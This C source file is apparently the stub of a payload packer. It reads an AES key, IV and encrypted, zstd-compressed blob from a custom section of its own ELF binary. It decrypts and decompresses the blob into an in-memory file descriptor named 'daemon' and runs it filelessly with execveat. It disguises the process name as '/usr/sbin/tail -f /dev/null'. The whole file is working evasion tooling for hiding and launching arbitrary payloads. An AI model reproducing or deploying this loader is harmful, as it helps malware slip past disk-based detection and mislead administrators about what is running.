#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <zstd.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <fcntl.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>
#include "aes.h" // TODO embed it somehow 


void print_hex(unsigned char *data, size_t size) {

  printf("unsigned char data[] = {");

  for (int i = 0; i < size; i++) {
    	if (i % 16 == 0)
      	    printf("\n\t");
	    
    	if (i < size - 1)
            printf("0x%0.2X ", data[i]);
    	else
      	    printf("0x%0.2X ", data[i]);
  }

  printf("};\n");
  
}

int	split(char *str, char **str_arr){
        int     i = 1;

	str_arr[i] = strtok(str, " ");
        while (str_arr[i] != NULL)
                str_arr[++i] = strtok(NULL, " ");

        return i;
}

unsigned char	*buff_depadding(unsigned char *input, size_t input_size, size_t *output_size){
	size_t padding_size;

    if (!input || !output_size || input_size == 0) {
        return NULL;
    }
	
    padding_size = input[input_size - 1];
    if (padding_size == 0 || padding_size > input_size) {
        return NULL;
    }

	*output_size = input_size - padding_size;

	unsigned char *unpadded_buff = (unsigned char *)calloc(*output_size, sizeof(unsigned char));
	if (!unpadded_buff)
		return NULL;

	memcpy(unpadded_buff, input, *output_size);

	return unpadded_buff;
}

void    decompress_blob(unsigned char *compressed, ssize_t compressed_size, int memfd, char **env, char **av){
    ZSTD_DStream *dstream = ZSTD_createDStream();
    ZSTD_initDStream(dstream);
    size_t  decompressed_size = 0;

    ssize_t toread = 16384; //16kb buffer size
    unsigned char *output_buffer = malloc(16384);
    ZSTD_inBuffer input = {compressed, compressed_size, 0};
    ZSTD_outBuffer output = {output_buffer, 16384, 0};

    while (input.pos < input.size){
        size_t result = ZSTD_decompressStream(dstream, &output, &input);
        if (ZSTD_isError(result)){
            printf("Decompression error: %s\n", ZSTD_getErrorName(result));
            break;
        }
        
        write(memfd, output_buffer, output.pos);

        output.pos = 0;
    }

    ZSTD_freeDStream(dstream);
    free(output_buffer);

	execveat(memfd, "", av, env, AT_EMPTY_PATH);
    //return final;
}

//TODO clean exit func
unsigned char    *exfil(char *filename, unsigned char *key, unsigned char *iv,  size_t *data_size){
    Elf64_Ehdr  *ehdr;
    Elf64_Shdr  *shdr;
    char        *mem;
    struct stat st;
    int         fd;

    if ((fd = open(filename, O_RDONLY)) < 0)
        return NULL;
    
    if (fstat(fd, &st) < 0) {
        close(fd);
        return NULL;
    }
    
    mem = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (mem == MAP_FAILED) {
        close(fd);
        return NULL;
    }
    
    ehdr = (Elf64_Ehdr *) mem;
    shdr = (Elf64_Shdr *) &mem[ehdr->e_shoff];
    //read section and parse data to key iv flag data

    for (int i = 0; i < ehdr->e_shnum; i++){
        if (shdr[i].sh_info == 1337){ // find a better way to id a section
            *data_size = shdr[i].sh_size - 48;
            unsigned char   *data = malloc(*data_size);
            if (!data)
                return NULL;
            
            memcpy(key, mem + shdr[i].sh_offset, 32);
            memcpy(iv, mem + shdr[i].sh_offset + 32, 16);
            memcpy(data, mem + shdr[i].sh_offset + 48, *data_size);
            return data;
        }
    }
    return NULL;
}

int main(int ac, char **av, char **env){
	struct AES_ctx	ctx;
    ssize_t 		size;
    char    		*file;
    int				pid, memfd;
	unsigned char	key[32];
	unsigned char	iv[16];
	unsigned char	iv_copy[16];
	ssize_t 		compressed_size;
	unsigned char	*compressed;
	char			*args[32] = {NULL,};

	args[0] = "/usr/sbin/tail -f /dev/null";
	for (int i = 0; i + 1 < ac; i++){
		args[i + 1] = av[i + 1];
	}

	size_t data_size;
	unsigned char *data = exfil(av[0], key, iv, &data_size);

	memfd = memfd_create("daemon", MFD_CLOEXEC);

	AES_init_ctx_iv(&ctx, key, iv);

	size_t depadded_size;
	AES_CBC_decrypt_buffer(&ctx, data, data_size);
	unsigned char *depadded = buff_depadding(data, data_size, &depadded_size);
	if (!depadded) {
		printf("Depadded malloc error\n");
		free(data);
		exit(1);
	}

	free(data);
	decompress_blob(depadded, depadded_size, memfd, env, args);
}